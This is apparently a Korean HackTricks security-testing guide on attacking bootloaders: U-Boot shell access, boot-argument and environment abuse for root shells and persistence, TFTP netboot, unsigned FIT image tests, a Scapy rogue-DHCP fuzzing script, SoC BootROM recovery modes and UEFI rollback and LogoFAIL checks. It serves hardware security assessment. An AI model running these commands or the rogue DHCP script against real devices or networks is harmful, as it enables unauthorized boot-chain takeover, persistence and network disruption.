# 부트로더 테스트

{{#include ../../banners/hacktricks-training.md}}

다음 단계들은 U-Boot, UEFI-class loader 같은 부트로더를 테스트하고 장치의 시작 구성을 수정할 때 권장됩니다. 초기 코드 실행 확보, 서명/롤백 보호 평가, 복구 또는 네트워크 부팅 경로 악용에 중점을 두세요.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 빠른 방법 및 환경 남용

1. 인터프리터 셸에 접근
- 부팅 중 `bootcmd`가 실행되기 전에 (대개 아무 키, 0, 스페이스 또는 보드별 "매직" 시퀀스) 알려진 중단 키를 눌러 U-Boot 프롬프트로 진입합니다.

2. 부트 상태 및 변수 확인
- 유용한 명령:
- `printenv` (환경 덤프)
- `bdinfo` (보드 정보, 메모리 주소)
- `help bootm; help booti; help bootz` (지원되는 커널 부팅 방법)
- `help ext4load; help fatload; help tftpboot` (사용 가능한 로더)

3. 루트 셸을 얻기 위한 부트 인자 수정
- 커널이 정상 init 대신 셸로 빠지게 `init=/bin/sh`를 추가:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP 서버에서 Netboot
- 네트워크를 구성하고 LAN에서 커널/fit 이미지를 가져옵니다:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 환경을 통해 변경사항 지속화
- env 저장소가 쓰기 보호되어 있지 않다면 제어를 지속시킬 수 있습니다:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` 같은 변수들이 폴백 경로에 영향을 미칩니다. 잘못된 값은 셸로 반복 진입을 허용할 수 있습니다.

6. 디버그/안전하지 않은 기능 확인
- 확인할 항목: `bootdelay` > 0, `autoboot` 비활성화, 제한 없는 `usb start; fatload usb 0:1 ...`, 직렬을 통한 `loady`/`loads` 가능성, 신뢰되지 않은 매체로부터의 `env import`, 서명 검사 없이 로드되는 커널/ramdisk 등.

7. U-Boot 이미지/검증 테스트
- 플랫폼이 FIT 이미지로 secure/verified boot를 주장한다면 unsigned 또는 변조된 이미지를 시도해 보세요:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 레거시 `verify=n` 동작이 있으면 임의 페이로드 부팅이 가능한 경우가 많습니다.

## Network-boot 표면(DHCP/PXE) 및 악성 서버

8. PXE/DHCP 파라미터 퍼징
- U-Boot의 레거시 BOOTP/DHCP 처리는 메모리 안전성 문제가 있었습니다. 예를 들어 CVE‑2024‑42040은 조작된 DHCP 응답을 통해 U-Boot 메모리에서 바이트를 네트워크로 leak할 수 있는 메모리 유출을 설명합니다. DHCP/PXE 코드 경로를 과도하게 긴/엣지 케이스 값들(옵션 67 bootfile-name, vendor options, file/servername 필드)로 테스트하여 정지나 leak 현상을 관찰하세요.
- netboot 중 부트 파라미터를 스트레스하기 위한 최소 Scapy 스니펫:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 또한 PXE 파일명 필드가 OS 측 프로비저닝 스크립트로 연결될 때 셸/로더 로직에 정제 없이 전달되는지도 검증하세요.

9. 악성 DHCP 서버를 통한 명령 주입 테스트
- Rogue DHCP/PXE 서비스를 구성하고 파일명 또는 옵션 필드에 문자를 주입해 부트 체인 후반의 명령 인터프리터에 도달할 수 있는지 시도하세요. Metasploit의 DHCP auxiliary, `dnsmasq`, 또는 커스텀 Scapy 스크립트가 유용합니다. 먼저 실험실 네트워크를 분리하세요.

## 정상 부트를 무시하는 SoC ROM 복구 모드

많은 SoC는 BootROM "loader" 모드를 노출하여 flash 이미지가 유효하지 않아도 USB/UART를 통해 코드를 수신합니다. secure-boot fuses가 태워지지 않았다면, 이는 체인 초기에 임의 코드 실행을 제공할 수 있습니다.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

장치에 secure-boot eFuses/OTP가 태워져 있는지 평가하세요. 그렇지 않다면 BootROM 다운로드 모드는 상위 레벨의 검증(U-Boot, kernel, rootfs)을 우회하고 첫 번째 스테이지 페이로드를 SRAM/DRAM에서 직접 실행하는 경우가 많습니다.

## UEFI/PC-class 부트로더: 빠른 검사

10. ESP 변조 및 롤백 테스트
- EFI System Partition(ESP)을 마운트하고 로더 구성요소를 확인하세요: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 벤더 로고 경로 등.
- Secure Boot revocations(dbx)이 최신이 아니면 다운그레이드되었거나 알려진 취약한 서명된 부트 구성요소로 부팅을 시도해 보세요. 플랫폼이 오래된 shims/bootmanagers를 여전히 신뢰하면 ESP에서 자체 커널이나 `grub.cfg`를 로드해 영구성을 확보할 수 있습니다.

11. 부트 로고 파싱 버그(LogoFAIL 클래스)
- 여러 OEM/IBV 펌웨어가 부트 로고를 처리하는 DXE의 이미지 파싱 결함에 취약했습니다. 공격자가 ESP의 벤더별 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 배치하고 재부팅하면 Secure Boot가 활성화되어 있어도 초기 부트 중 코드 실행이 가능해질 수 있습니다. 플랫폼이 사용자가 제공한 로고를 수락하는지, 해당 경로가 OS에서 쓰기 가능한지 테스트하세요.

## 하드웨어 주의사항

초기 부트 중 SPI/NAND flash와 상호작용(예: 읽기를 우회하기 위해 핀을 접지)할 때는 주의하고 항상 플래시 데이터시트를 참조하세요. 타이밍이 맞지 않는 쇼트는 장치 또는 프로그래머를 손상시킬 수 있습니다.

## 메모 및 추가 팁

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용해 환경 블롭을 RAM과 저장소 사이에 옮겨보세요; 일부 플랫폼은 인증 없이 이동식 미디어에서 env를 가져오도록 허용합니다.
- `extlinux.conf`로 부팅하는 Linux 기반 시스템에서 부트 파티션의 `APPEND` 라인(예: `init=/bin/sh` 또는 `rd.break` 삽입)을 수정하면 서명 검사가 없을 때 충분한 경우가 많습니다.
- 사용자 공간에 `fw_printenv/fw_setenv`가 제공되는 경우 `/etc/fw_env.config`가 실제 env 저장소와 일치하는지 확인하세요. 잘못된 오프셋은 잘못된 MTD 영역을 읽거나 쓸 수 있게 합니다.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
